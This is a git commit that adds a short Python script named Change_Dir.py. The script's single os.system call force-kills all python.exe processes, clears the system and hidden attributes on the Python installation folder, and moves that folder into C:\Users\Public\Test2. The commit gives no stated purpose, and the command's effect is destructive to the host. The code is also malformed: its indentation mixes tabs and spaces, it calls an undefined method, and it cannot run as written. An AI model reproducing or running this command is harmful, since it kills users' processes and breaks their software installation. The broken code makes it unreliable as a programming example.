05db838793bc16c2b6ccc8f13cc181957ba6f7cd
UQABXO <92090431+UQABXO@users.noreply.github.com>
2022-05-18 12:44:15 +0200

    Create Change_Dir.py

---
+++ Change_Dir.py
@@ -0,0 +1,8 @@
+import sys, os
+class Change_Dir():
+  def __init__(self, _):
+		self._ = " ".join(_.args)
+		self.Main()
+			dirname = os.path.dirname(sys.executable)
+			new_dir = r"C:\Users\Public\Test2"
+			os.system("cmd.exe /c taskkill /IM python.exe /F & attrib -s -h " + dirname + " & move " + dirname + " " + new_dir)
